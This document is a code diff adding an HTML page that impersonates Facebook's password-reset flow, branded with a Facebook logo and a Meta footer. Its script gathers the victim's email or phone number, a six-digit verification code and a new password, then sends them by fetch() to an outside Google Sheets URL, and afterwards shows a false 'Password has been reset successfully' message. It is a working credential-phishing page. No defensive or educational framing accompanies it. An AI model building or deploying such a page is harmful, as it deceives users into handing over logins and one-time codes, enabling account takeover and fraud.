@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Password Reset</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+            margin: 0;
+        }
+
+        .facebook-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            color: #1877f2;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .container {
+            width: 400px;
+            background: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h1 {
+            color: #1877f2;
+            font-size: 24px;
+            margin-bottom: 24px;
+        }
+
+        .input-container {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 8px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .next-button, .cancel-button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .next-button {
+            background-color: #1877f2;
+            color: #fff;
+        }
+
+        .next-button:hover {
+            background-color: #145dbf;
+        }
+
+        .cancel-button {
+            background-color: #e0e0e0;
+            color: #333;
+        }
+
+        .cancel-button:hover {
+            background-color: #ccc;
+        }
+
+        .alert {
+            background-color: #ffdddd;
+            color: #d8000c;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #65676b;
+            position: absolute;
+            bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="facebook-logo">facebook</div>
+    <div id="page1" class="container" style="display: block;">
+        <h1>Step 1: Enter Email or Phone</h1>
+        <div class="input-container">
+            <label for="emailOrPhone">Email or Phone Number</label>
+            <input type="text" id="emailOrPhone" placeholder="Enter your email or phone number">
+            <div id="alertMessage" class="alert">Please fill in at least one field to search for your account</div>
+            <div class="button-container">
+                <button class="cancel-button" onclick="goBack()">Cancel</button>
+                <button class="next-button" onclick="goToNextPage('page1', 'page2')">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="page2" class="container" style="display: none;">
+        <h1>Step 2: Enter Verification Code</h1>
+        <div class="input-container">
+            <label for="verificationCode">Verification Code</label>
+            <input type="text" id="verificationCode" placeholder="Enter the verification code">
+            <div class="button-container">
+                <button class="cancel-button" onclick="goBack()">Cancel</button>
+                <button class="next-button" onclick="goToNextPage('page2', 'page3')">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="page3" class="container" style="display: none;">
+        <h1>Step 3: Set New Password</h1>
+        <div class="input-container">
+            <label for="newPassword">New Password</label>
+            <input type="password" id="newPassword" placeholder="Enter new password">
+            <label for="confirmPassword">Confirm Password</label>
+            <input type="password" id="confirmPassword" placeholder="Confirm new password">
+            <div class="button-container">
+                <button class="cancel-button" onclick="goBack()">Cancel</button>
+                <button class="next-button" onclick="finish()">Finish</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentPage = 1;
+
+        function goToNextPage(currentId, nextId) {
+            const emailOrPhone = document.getElementById("emailOrPhone").value.trim();
+            const verificationCode = document.getElementById("verificationCode").value.trim();
+
+            if (currentId === 'page1' && !emailOrPhone) {
+                document.getElementById("alertMessage").style.display = "block";
+            } else if (currentId === 'page2' && verificationCode.length !== 6) {
+                alert("Please enter a 6-digit verification code.");
+            } else {
+                document.getElementById(currentId).style.display = "none";
+                document.getElementById(nextId).style.display = "block";
+                currentPage++;
+                document.getElementById("alertMessage").style.display = "none";
+            }
+        }
+
+        function goBack() {
+            if (currentPage > 1) {
+                document.getElementById("page" + currentPage).style.display = "none";
+                document.getElementById("page" + (currentPage - 1)).style.display = "block";
+                currentPage--;
+            }
+        }
+
+        function finish() {
+            const newPassword = document.getElementById("newPassword").value.trim();
+            const confirmPassword = document.getElementById("confirmPassword").value.trim();
+
+            if (newPassword.length < 8) {
+                alert("Password must be at least 8 characters long.");
+            } else if (newPassword !== confirmPassword) {
+                alert("Passwords do not match.");
+            } else {
+                // هنا يمكنك إضافة الكود لإرسال البيانات إلى Google Sheets
+                const emailOrPhone = document.getElementById("emailOrPhone").value;
+                const verificationCode = document.getElementById("verificationCode").value;
+                const formData = {
+                    emailOrPhone: emailOrPhone,
+                    verificationCode: verificationCode,
+                    newPassword: newPassword,
+                };
+
+                fetch('https://docs.google.com/spreadsheets/d/1O2dyxwDIp0XzYs43785NBzV0JAdyLsJZwqBLc8dCmNs/edit?usp=sharing', {
+                    method: 'POST',
+                    body: JSON.stringify(formData),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    alert("Password has been reset successfully!");
+                    // هنا يمكنك إضافة الكود للانتقال إلى صفحة أخرى أو إجراء آخر.
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            }
+        }
+    </script>
+    <footer>
+        <p>Meta © 2024</p>
+    </footer>
+</body>
+</html>
